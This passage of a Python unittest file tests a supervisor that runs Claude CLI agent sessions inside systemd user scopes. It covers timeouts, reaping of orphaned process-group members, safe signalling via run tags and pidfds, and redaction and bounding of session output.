            p = subprocess.Popen(["sleep", "30"], pass_fds=kw["pass_fds"], start_new_session=True)
            procs.append(p)
            return p
        run = self.run_dict(["true"])
        runner.start(self.cfg, run, popen=popen)
        self.addCleanup(lambda: procs[0].poll() is None and procs[0].kill())
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 0)   # however long its startup takes
        self.assertTrue(runner._held(self.r.id, self.cfg))
        with self.assertRaises(RuntimeError):
            runner.execute(self.cfg, dict(run))            # nobody else runs it either
        procs[0].kill()
        procs[0].wait()
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertEqual(self.restart().outcome, "failed")

    def test_reap_stops_group_members_after_the_leader_exited(self):
        import subprocess
        pidfile = self.bin / "left.pid"
        leader = subprocess.Popen(["sh", "-c", SURVIVOR.replace('"$0.pid"', f'"{pidfile}"') + "exit 0\n"],
                                  start_new_session=True, env=tagged_env())
        since = runner._proc_start(leader.pid)
        leader.wait(5)                                    # the leader is gone at once
        for _ in range(100):
            if pidfile.exists() and pidfile.read_text().strip():
                break
            time.sleep(0.02)
        survivor = int(pidfile.read_text())
        self.addCleanup(_kill_quietly, survivor)
        run = self.run_dict(["true"])
        run.update(child_pid=leader.pid, child_pgid=leader.pid, started_epoch=time.time() - 10,
                   limit_seconds=1.0, run_tag=TAG, child_start=since)
        runner.write_run(run)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertTrue(_gone(survivor))
        self.assertEqual(self.restart().outcome, "timeout")

    def test_deferred_finish_keeps_no_raw_output(self):
        from swarm.supervisor.settings import runs_dir
        secret = "sk-ant-api03-" + "A1b2C3d4" * 8
        argv = [fake(self.bin / "claude", f"echo {secret}; exit 3\n")]
        run = self.run_dict(argv)
        runner.write_run(run)
        self.h.set_available(False)
        self.assertEqual(runner.execute(self.cfg, run, poll=0.05, board_every=0.1), "failed")
        self.h.set_available(True)
        d = runner.run_dir(self.cfg)
        self.assertTrue(runner.run_file(self.r.id, self.cfg).exists())          # finish deferred
        self.assertEqual(list(d.glob("*.out")) + list(d.glob("*.err")), [])
        self.assertNotIn(secret, (d / f"r{self.r.id}.tail.txt").read_text())

    def test_post_lost_after_the_row_finished_is_retried_once(self):
        from unittest import mock
        run = self.run_dict(["true"])
        run["agent_key"] = None
        runner.write_run(run)
        with self.board() as b:
            cls = type(b)
        with mock.patch.object(cls, "post", side_effect=ConnectionError("down")):
            self.assertFalse(runner.finish(self.cfg, dict(run), "failed"))
        self.assertEqual(self.restart().outcome, "failed")            # the row finished...
        kept = json.loads(runner.run_file(self.r.id, self.cfg).read_text())
        self.assertIn("ended: failed", kept["post_pending"])           # ...its post is recorded
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
            self.assertEqual(runner.reap(self.cfg, b), 0)
        self.assertEqual(len(self.posts()), 1)

    def test_timeout_kills_group_members_that_ignore_sigterm(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", SURVIVOR + "wait\n")]
        self.enrol_soon(sid)
        self.assertEqual(self.execute(self.run_dict(argv, limit=1.0)), "timeout")
        self.assertTrue(_gone(self._survivor_pid()))

    def test_leftovers_of_a_completed_session_are_stopped(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", SURVIVOR + "sleep 0.5; echo '{\"subtype\":\"success\"}'\n")]
        self.enrol_soon(sid)
        self.assertEqual(self.execute(self.run_dict(argv)), "completed")
        self.assertTrue(_gone(self._survivor_pid()))

    def test_reap_kills_an_orphaned_group_member_that_ignores_sigterm(self):
        import subprocess
        pidfile = self.bin / "orphan.pid"
        child = subprocess.Popen(["sh", "-c", SURVIVOR.replace('"$0.pid"', f'"{pidfile}"') + "wait\n"],
                                 start_new_session=True, env=tagged_env())
        self.addCleanup(_end, child)
        for _ in range(100):
            if pidfile.exists() and pidfile.read_text().strip():
                break
            time.sleep(0.02)
        survivor = int(pidfile.read_text())
        self.addCleanup(_kill_quietly, survivor)
        run = self.run_dict(["true"])
        run.update(runner_pid=None, child_pid=child.pid, started_epoch=time.time() - 10, limit_seconds=1.0,
                   run_tag=TAG, child_start=runner._proc_start(child.pid))
        runner.write_run(run)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        child.wait(5)
        self.assertTrue(_gone(survivor))

    def test_output_is_redacted_bounded_and_the_raw_files_go(self):
        from swarm.supervisor.settings import runs_dir
        secret = "sk-ant-api03-" + "A1b2C3d4" * 8
        argv = [fake(self.bin / "claude", f"head -c 100000 /dev/zero | tr '\\\\0' x; echo; echo {secret}; "
                                          f"echo {secret} >&2; exit 3\n")]
        self.assertEqual(self.execute(self.run_dict(argv)), "failed")
        d = runner.run_dir(self.cfg)
        self.assertEqual(sorted(p.name for p in d.iterdir() if p.suffix != ".lock"), [f"r{self.r.id}.tail.txt"])
        tail = d / f"r{self.r.id}.tail.txt"
        text = tail.read_text()
        self.assertEqual(stat.S_IMODE(tail.stat().st_mode), 0o600)
        self.assertNotIn(secret, text)
        self.assertIn("REDACTED", text)
        self.assertLess(len(text), 2 * runner.TAIL_BYTES + 1000)
        self.assertIn("earlier output dropped", text)

    def test_reap_prunes_old_tails_and_finished_runs_lock_files(self):
        from swarm.supervisor.settings import ensure_private_dir, runs_dir
        ensure_private_dir(self.cfg)
        d = runner.run_dir(self.cfg)
        d.mkdir(mode=0o700, exist_ok=True)
        old, fresh, done = d / "r900.tail.txt", d / "r901.tail.txt", d / "r902.lock"
        for p in (old, fresh, done):
            p.write_text("")
        os.utime(old, (time.time() - 8 * 86400,) * 2)
        live = runner.own(903, self.cfg)                           # a live runner's lock stays
        self.addCleanup(os.close, live)
        with self.board() as b:
            runner.reap(self.cfg, b)
        self.assertEqual((old.exists(), fresh.exists(), done.exists(), (d / "r903.lock").exists()),
                         (False, True, False, True))

    def test_marker_removal_failure_keeps_the_run_file_and_reap_retries(self):
        from unittest import mock
        run = self.run_dict(["true"])
        run["agent_key"] = None
        runner.write_run(run)
        with mock.patch.object(markers, "remove_resume_marker", return_value=False):
            self.assertFalse(runner.finish(self.cfg, dict(run), "failed"))
        kept = json.loads(runner.run_file(self.r.id, self.cfg).read_text())
        self.assertTrue(kept["board_done"])
        self.assertTrue(Path(run["marker"]).exists())
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertFalse(Path(run["marker"]).exists())
        self.assertFalse(runner.run_file(self.r.id, self.cfg).exists())
        self.assertEqual(len(self.posts()), 1)

    def test_a_run_finished_twice_posts_once(self):
        run = self.run_dict(["true"])
        run["agent_key"] = None
        runner.write_run(run)
        self.assertTrue(runner.finish(self.cfg, dict(run), "failed"))
        runner.write_run(run)          # the runner died after posting, before deleting its run file
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertEqual(len(self.posts()), 1)
        self.assertFalse(runner.run_file(self.r.id, self.cfg).exists())


class ReusedGroupTests(RunnerFixTests):
    """A dead session's group id reused by an unrelated group: reap never signals it."""

    def _group(self, env):
        import subprocess
        g = subprocess.Popen(["sleep", "30"], start_new_session=True, env=env)
        self.addCleanup(_end, g)
        return g

    def _reap_with(self, g, **fields):
        run = self.run_dict(["true"])
        run.update(child_pid=g.pid, child_pgid=g.pid, started_epoch=time.time() - 10, limit_seconds=1.0,
                   **fields)
        runner.write_run(run)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)

    def test_member_without_the_runs_tag_is_never_signalled(self):
        g = self._group({k: v for k, v in os.environ.items() if k != runner.RUN_ENV})
        self._reap_with(g, run_tag=TAG, child_start="0")
        time.sleep(0.3)
        self.assertIsNone(g.poll())                          # untouched
        self.assertEqual(self.restart().outcome, "failed")   # the recorded (none) outcome, not timeout

    def test_member_with_another_runs_tag_is_never_signalled(self):
        g = self._group(tagged_env("r2-ffffffffffffffff"))
        self._reap_with(g, run_tag=TAG, child_start="0")
        time.sleep(0.3)
        self.assertIsNone(g.poll())

    def test_member_older_than_the_session_is_never_signalled(self):
        g = self._group(tagged_env())
        later = str(int(runner._proc_start(g.pid)) + 10 ** 6)
        self._reap_with(g, run_tag=TAG, child_start=later)
        time.sleep(0.3)
        self.assertIsNone(g.poll())

    def test_a_run_recorded_without_a_tag_signals_nothing(self):
        g = self._group(tagged_env())
        self._reap_with(g)
        time.sleep(0.3)
        self.assertIsNone(g.poll())

    def test_the_session_gets_its_run_tag(self):
        argv = [fake(self.bin / "claude", f'printf %s "${runner.RUN_ENV}" > "$0.tag"; exit 3\n')]
        run = self.run_dict(argv)
        self.execute(run)
        self.assertRegex((self.bin / "claude.tag").read_text(), rf"^r{self.r.id}-[0-9a-f]{{16}}$")


class ScopeTests(RunnerFixTests):
    """Containment by systemd scope (the fake systemd-run/systemctl every runner test uses)."""

    def test_scope_is_available_through_the_user_manager(self):
        self.assertTrue(runner.scope_available())
        with mock_env(SWARM_NO_SYSTEMD="1"):
            self.assertFalse(runner.scope_available())

    def test_a_session_runs_in_its_own_scope(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", "sleep 0.5; echo '{\"subtype\":\"success\"}'\n")]
        self.enrol_soon(sid)
        self.assertEqual(self.execute(self.run_dict(argv)), "completed")
        unit = self.unit()
        self.assertRegex(unit, rf"^swarm-r{self.r.id}-[0-9a-f]{{8}}\.scope$")
        self.assertIn(f"systemd-run --user --scope --unit={unit} --collect --quiet -- {argv[0]}", self.calls())

    def test_timeout_stops_the_scope_and_everything_in_it(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", SURVIVOR + "wait\n")]
        self.enrol_soon(sid)
        self.assertEqual(self.execute(self.run_dict(argv, limit=1.0)), "timeout")
        unit = self.unit()
        calls = self.calls()
        self.assertIn(f"systemctl --user kill --signal=SIGTERM {unit}", calls)
        self.assertIn(f"systemctl --user kill --signal=SIGKILL {unit}", calls)   # the survivor ignored TERM
        self.assertIn(f"systemctl --user stop {unit}", calls)
        self.assertTrue(_gone(self._survivor_pid()))

    def test_reap_stops_a_dead_runners_scope_by_its_recorded_unit(self):
        import subprocess
        unit = f"swarm-r{self.r.id}-deadbeef.scope"
        leader = subprocess.Popen([runner.SYSTEMD_RUN, "--user", "--scope", f"--unit={unit}", "--collect",
                                   "--quiet", "--", "sleep", "30"], start_new_session=True)
        self.addCleanup(_end, leader)
        for _ in range(100):
            if (self.shim / "state" / f"{unit}.pid").exists():
                break
            time.sleep(0.02)
        run = self.run_dict(["true"])
        run.update(unit=unit, child_pid=leader.pid, child_pgid=leader.pid, started_epoch=time.time() - 10,
                   limit_seconds=1.0)
        runner.write_run(run)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertIn(f"systemctl --user kill --signal=SIGTERM {unit}", self.calls())
        self.assertIsNotNone(leader.wait(5))
        self.assertEqual(self.restart().outcome, "timeout")

    def test_reap_of_a_scope_already_gone_signals_nothing(self):
        run = self.run_dict(["true"])
        run.update(unit=f"swarm-r{self.r.id}-00000000.scope", unit_seen_active=True, child_pid=999999999,
                   started_epoch=time.time() - 10, limit_seconds=1.0)
        runner.write_run(run)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertFalse(any(" kill " in c or " stop " in c for c in self.calls()))
        self.assertEqual(self.restart().outcome, "failed")


    # ---- the launch window: the runner died between recording its unit and the scope appearing ----

    def _dead_runner_run(self, **fields):
        run = self.run_dict(["true"])
        run.update(unit=f"swarm-r{self.r.id}-0badc0de.scope", unit_seen_active=False, **fields)
        runner.write_run(run)
        return run

    def _spawn_scope(self, unit):
        import subprocess
        p = subprocess.Popen([runner.SYSTEMD_RUN, "--user", "--scope", f"--unit={unit}", "--collect", "--quiet",
                              "--", "sleep", "30"], start_new_session=True)
        self.addCleanup(_end, p)
        for _ in range(100):
            if (self.shim / "state" / f"{unit}.pid").exists():
                break
            time.sleep(0.02)
        return p

    def test_unseen_scope_within_the_launch_grace_is_left_alone_then_appears_and_is_stopped(self):
        run = self._dead_runner_run(launch_epoch=time.time(), limit_seconds=0.5)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 0)        # not there yet: may still appear
        self.assertTrue(runner.run_file(self.r.id, self.cfg).exists())
        p = self._spawn_scope(run["unit"])                        # the orphaned systemd-run creates it
        time.sleep(0.6)                                           # past its wall clock
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertIn(f"systemctl --user kill --signal=SIGTERM {run['unit']}", self.calls())
        self.assertIsNotNone(p.wait(5))
        self.assertEqual(self.restart().outcome, "timeout")

    def test_unseen_scope_after_the_launch_grace_is_failed_without_signals(self):
        self._dead_runner_run(launch_epoch=time.time() - runner.LAUNCH_GRACE - 1)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertFalse(any(" kill " in c or " stop " in c for c in self.calls()))
        self.assertEqual(self.restart().outcome, "failed")

    def test_scope_that_exists_in_any_state_is_stopped_by_name(self):
        run = self._dead_runner_run(launch_epoch=time.time())
        (self.shim / "state" / f"{run['unit']}.state").write_text("LoadState=loaded\nActiveState=failed\n")
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertIn(f"systemctl --user stop {run['unit']}", self.calls())
        self.assertEqual(self.restart().outcome, "failed")

    def test_running_scope_within_its_clock_is_left_to_run(self):
        run = self._dead_runner_run(launch_epoch=time.time(), started_epoch=time.time(), limit_seconds=60)
        p = self._spawn_scope(run["unit"])
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 0)
        self.assertIsNone(p.poll())

    def test_the_runner_records_the_scope_seen_active(self):
        from unittest import mock
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", "sleep 0.5; echo '{\"subtype\":\"success\"}'\n")]
        self.enrol_soon(sid)
        with mock.patch.object(runner, "finish", wraps=runner.finish) as fin:
            self.assertEqual(self.execute(self.run_dict(argv)), "completed")
        run = fin.call_args[0][1]
        self.assertTrue(run["unit_seen_active"])
        self.assertTrue(run["unit"].endswith(".scope"))
        self.assertIn(f"systemctl --user show -p ActiveState,LoadState {run['unit']}", self.calls())


class PidfdFallbackTests(RunnerFixTests):
    def test_member_signals_go_through_a_checked_pidfd(self):
        import signal as sig
        import subprocess
        mine = subprocess.Popen(["sleep", "30"], start_new_session=True, env=tagged_env())
        other = subprocess.Popen(["sleep", "30"], start_new_session=True, env=tagged_env("r9-0000000000000000"))
        for p in (mine, other):
            self.addCleanup(_end, p)
        time.sleep(0.1)
        runner._signal_member(other.pid, other.pid, TAG, 0, sig.SIGKILL)   # not this run's: refused
        runner._signal_member(mine.pid, mine.pid, TAG, 0, sig.SIGKILL)
        self.assertIsNotNone(mine.wait(5))
        self.assertIsNone(other.poll())

    def test_no_pidfd_support_signals_nothing(self):
        import signal as sig
        import subprocess
        from unittest import mock
        mine = subprocess.Popen(["sleep", "30"], start_new_session=True, env=tagged_env())
        self.addCleanup(_end, mine)
        time.sleep(0.1)
        with mock.patch.dict(runner.os.__dict__):
            del runner.os.__dict__["pidfd_open"]           # a platform without pidfds
            runner._signal_member(mine.pid, mine.pid, TAG, 0, sig.SIGKILL)
        time.sleep(0.2)
        self.assertIsNone(mine.poll())

    def test_no_user_manager_refuses_to_launch(self):
        argv = [fake(self.bin / "claude", 'touch "$0.ran"\n')]
        with mock_env(SWARM_NO_SYSTEMD="1"):
            self.assertEqual(self.execute(self.run_dict(argv)), "refused")
        self.assertFalse((self.bin / "claude.ran").exists())
        self.assertFalse(any(c.startswith("systemd-run") for c in self.calls()))
        self.assertEqual(self.restart().outcome, "refused")
        with self.board() as b:
            posts = [m.message for m in b.recent_messages(20, job="J") if "ended:" in m.message]
        self.assertEqual(len(posts), 1)
        self.assertIn("ended: refused (no user systemd manager)", posts[0])


def mock_env(**values):
    from unittest import mock
    return mock.patch.dict(os.environ, values)


for _n in [n for n in vars(RunnerFixTests) if n.startswith("test_")]:
    setattr(ScopeTests, _n, None)
    setattr(PidfdFallbackTests, _n, None)

for _n in [n for n in vars(RunnerFixTests) if n.startswith("test_")]:
    setattr(ReusedGroupTests, _n, None)


for _n in [n for n in vars(RunnerTests) if n.startswith("test_")]:
    setattr(RunnerFixTests, _n, None)   # the parent's tests run once, in RunnerTests


class DoctorContainmentTests(RunnerTests):
    def test_doctor_fails_without_a_user_manager_and_is_quiet_when_off(self):
        from unittest import mock
        from swarm import bootstrap
        cfg = dict(self.cfg)
        with mock_env(SWARM_NO_SYSTEMD="1"):
            (c,) = bootstrap._containment_checks(cfg)        # no user manager: replacements refused
        self.assertIs(c.ok, False)
        self.assertIn("loginctl enable-linger", c.fix)
        with mock.patch.object(runner, "scope_available", return_value=True):
            (c,) = bootstrap._containment_checks(cfg)
        self.assertIs(c.ok, True)
        cfg["supervise"] = {"enabled": False}
        self.assertEqual(bootstrap._containment_checks(cfg), [])


for _n in [n for n in vars(RunnerTests) if n.startswith("test_")]:
    setattr(DoctorContainmentTests, _n, None)
